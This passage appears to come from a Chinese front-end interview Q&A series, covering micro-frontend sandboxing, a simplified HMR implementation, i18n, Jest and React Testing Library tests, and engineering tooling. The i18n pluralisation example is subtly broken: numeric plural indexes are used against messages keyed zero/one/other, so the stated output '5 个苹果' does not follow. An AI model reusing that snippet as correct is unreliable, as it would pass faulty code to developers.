    this.windowSnapshot = { ...window }
    // 恢复子应用修改
    Object.keys(this.modifyPropsMap).forEach(key => {
      window[key] = this.modifyPropsMap[key]
    })
  }
  
  inactive() {
    // 记录修改
    Object.keys(window).forEach(key => {
      if (window[key] !== this.windowSnapshot[key]) {
        this.modifyPropsMap[key] = window[key]
        window[key] = this.windowSnapshot[key]
      }
    })
  }
}

// 3. 公共依赖共享
// Module Federation shared
shared: {
  react: { singleton: true },
  'react-dom': { singleton: true }
}

// 4. 路由同步
// 主应用监听路由变化，通知子应用
window.addEventListener('popstate', () => {
  microAppDispatch({ type: 'ROUTE_CHANGE', path: location.pathname })
})
```

---

## Q37. 如何实现前端代码的热更新（HMR）？

**答：**

```javascript
// 简化版 HMR 实现

// 1. WebSocket 连接
const ws = new WebSocket('ws://localhost:8080')

ws.onmessage = (event) => {
  const { type, module } = JSON.parse(event.data)
  
  if (type === 'hot-update') {
    // 收到更新通知
    fetch(`/${module}?t=${Date.now()}`)
      .then(r => r.text())
      .then(code => {
        // 执行新代码
        eval(code)
        // 重新执行模块
        hotReload(module)
      })
  }
}

// 2. 模块热替换逻辑
const moduleCache = new Map()

function defineModule(id, factory) {
  moduleCache.set(id, { factory, exports: {} })
}

function hotReload(moduleId) {
  const module = moduleCache.get(moduleId)
  if (!module) return

  // 保存旧 exports
  const oldExports = module.exports
  
  // 重新执行模块
  module.factory(module.exports, require)
  
  // 通知更新
  const updateCallbacks = module.hot?.callbacks || []
  updateCallbacks.forEach(cb => cb(module.exports, oldExports))
}

// 3. 组件级热更新（React）
if (module.hot) {
  module.hot.accept('./Component', (NewComponent, OldComponent) => {
    // React Hot Loader 会处理组件替换
    ReactDOM.render(<NewComponent />, root)
  })
}

// 4. Vue HMR
if (module.hot) {
  module.hot.accept()
  
  const api = require('vue-hot-reload-api')
  api.rerender('id', renderFunction)
  api.reload('id', options)
}

// Vite HMR 实现（基于原生 ES Module）
// 浏览器直接请求模块，服务端通过 WebSocket 通知哪些模块变化
// 浏览器只重新请求变化的模块及其依赖链
```

---

## Q38. 如何实现前端的国际化（i18n）？

**答：**

```javascript
// 基础实现
class I18n {
  constructor(options = {}) {
    this.locale = options.locale || 'zh'
    this.fallbackLocale = options.fallbackLocale || 'en'
    this.messages = options.messages || {}
    this.listeners = []
  }

  // 设置语言
  setLocale(locale) {
    this.locale = locale
    this.listeners.forEach(fn => fn(locale))
  }

  // 翻译
  t(key, params = {}) {
    const message = this.getMessage(key)
    return this.interpolate(message, params)
  }

  getMessage(key) {
    const keys = key.split('.')
    let result = this.messages[this.locale]
    
    for (const k of keys) {
      result = result?.[k]
      if (!result) break
    }
    
    // 回退
    if (!result && this.locale !== this.fallbackLocale) {
      result = this.getFallbackMessage(key)
    }
    
    return result || key
  }

  interpolate(message, params) {
    return message.replace(/\{(\w+)\}/g, (match, key) => {
      return params[key] !== undefined ? params[key] : match
    })
  }

  // 复数处理
  n(key, count) {
    const message = this.getMessage(key)
    const plural = this.getPluralForm(count, this.locale)
    return this.interpolate(message[plural], { count })
  }

  getPluralForm(count, locale) {
    // 不同语言的复数规则
    const rules = {
      zh: (n) => 0,  // 中文无复数变化
      en: (n) => n === 1 ? 0 : 1,
      ru: (n) => {
        if (n % 10 === 1 && n % 100 !== 11) return 0
        if ([2, 3, 4].includes(n % 10) && ![12, 13, 14].includes(n % 100)) return 1
        return 2
      }
    }
    const rule = rules[locale] || rules.en
    return rule(count)
  }
}

// 消息定义
const messages = {
  zh: {
    hello: '你好，{name}',
    apples: {
      zero: '没有苹果',
      one: '1 个苹果',
      other: '{count} 个苹果'
    }
  },
  en: {
    hello: 'Hello, {name}',
    apples: {
      zero: 'no apples',
      one: '1 apple',
      other: '{count} apples'
    }
  }
}

const i18n = new I18n({
  locale: 'zh',
  messages
})

i18n.t('hello', { name: 'Tom' })  // '你好，Tom'
i18n.n('apples', 5)  // '5 个苹果'

// 日期/数字格式化
const date = new Intl.DateTimeFormat(i18n.locale).format(new Date())
const number = new Intl.NumberFormat(i18n.locale).format(1234567.89)
const currency = new Intl.NumberFormat(i18n.locale, {
  style: 'currency',
  currency: 'CNY'
}).format(99.99)
```

---

## Q39. 如何实现前端的单元测试？

**答：**

```javascript
// Jest 测试示例

// 被测试的函数
export function sum(a, b) {
  return a + b
}

export async function fetchUser(id) {
  const response = await fetch(`/api/users/${id}`)
  if (!response.ok) throw new Error('User not found')
  return await response.json()
}

// 测试文件 sum.test.js
import { sum, fetchUser } from './sum'
import { jest } from '@jest/globals'

describe('sum', () => {
  // 基础测试
  test('adds 1 + 2 to equal 3', () => {
    expect(sum(1, 2)).toBe(3)
  })

  // 边界值
  test('handles large numbers', () => {
    expect(sum(Number.MAX_SAFE_INTEGER, 1)).toBe(Number.MAX_SAFE_INTEGER + 1)
  })

  // 异常输入
  test('returns NaN for non-numbers', () => {
    expect(sum('a', 'b')).toBeNaN()
  })
})

// 异步测试
describe('fetchUser', () => {
  // Mock fetch
  global.fetch = jest.fn()

  beforeEach(() => {
    fetch.mockClear()
  })

  test('fetches user successfully', async () => {
    const mockUser = { id: 1, name: 'Tom' }
    fetch.mockResolvedValueOnce({
      ok: true,
      json: async () => mockUser
    })

    const user = await fetchUser(1)
    
    expect(user).toEqual(mockUser)
    expect(fetch).toHaveBeenCalledWith('/api/users/1')
  })

  test('throws on error response', async () => {
    fetch.mockResolvedValueOnce({ ok: false })
    
    await expect(fetchUser(1)).rejects.toThrow('User not found')
  })
})

// 组件测试（React + React Testing Library）
import { render, screen, fireEvent } from '@testing-library/react'
import Counter from './Counter'

test('increments counter', () => {
  render(<Counter />)
  
  const button = screen.getByText('Count: 0')
  fireEvent.click(button)
  
  expect(screen.getByText('Count: 1')).toBeInTheDocument()
})

// Mock 定时器
test('debounced input', () => {
  jest.useFakeTimers()
  
  const onSearch = jest.fn()
  render(<Search onSearch={onSearch} />)
  
  const input = screen.getByRole('textbox')
  fireEvent.change(input, { target: { value: 'test' } })
  
  // 快进时间
  jest.advanceTimersByTime(300)
  
  expect(onSearch).toHaveBeenCalledWith('test')
})

// 覆盖率检查
// jest --coverage
// Statements: 100% (每个语句都执行了)
// Branches: 100% (每个分支都执行了)
// Functions: 100% (每个函数都调用了)
// Lines: 100% (每行都执行了)
```

---

## Q40. 前端工程化包含哪些内容？

**答：**

```javascript
// 前端工程化主要包含：

// 1. 标准化（Linting）
// ESLint - 代码规范
// Prettier - 代码格式化
// commitlint - 提交规范
// husky + lint-staged - 提交前检查

// eslint.config.js
export default [
  {
    rules: {
      'no-unused-vars': 'error',
      'prefer-const': 'warn'
    }
  }
]

// 2. 模块化（Module Bundling）
// Webpack/Vite/Rollup/Parcel

// webpack.config.js
module.exports = {
  entry: './src/index.js',
  output: {
    path: path.resolve(__dirname, 'dist'),
    filename: '[name].[contenthash].js'
  },
  optimization: {
    splitChunks: {
      chunks: 'all',      // 代码分割
      cacheGroups: {
        vendor: {
          test: /[\\/]node_modules[\\/]/,
          name: 'vendors'
        }
      }
    }
  }
}

// 3. 自动化测试
// 单元测试：Jest/Vitest
// E2E测试：Cypress/Playwright
// 视觉回归：Percy/Chromatic

// 4. CI/CD
// GitHub Actions / GitLab CI / Jenkins

// .github/workflows/ci.yml
name: CI
on: [push, pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - uses: actions/setup-node@v2
        with:
          node-version: '18'
      - run: npm ci
      - run: npm run lint
      - run: npm run test
      - run: npm run build
      - run: npm run test:e2e

// 5. 监控与埋点
// Sentry - 错误监控
// Google Analytics/Mixpanel - 行为分析

// 6. 性能优化
// Lighthouse CI - 自动化性能测试
// Bundle Analyzer - 分析包体积

// 7. 文档生成
// JSDoc/TypeDoc - API文档
// Storybook - 组件文档

// 8. 依赖管理
// npm/yarn/pnpm - 包管理
// Renovate/Dependabot - 自动更新依赖

// 9. 代码质量
// Code Review
// SonarQube - 代码质量分析
// Codecov - 覆盖率报告
```
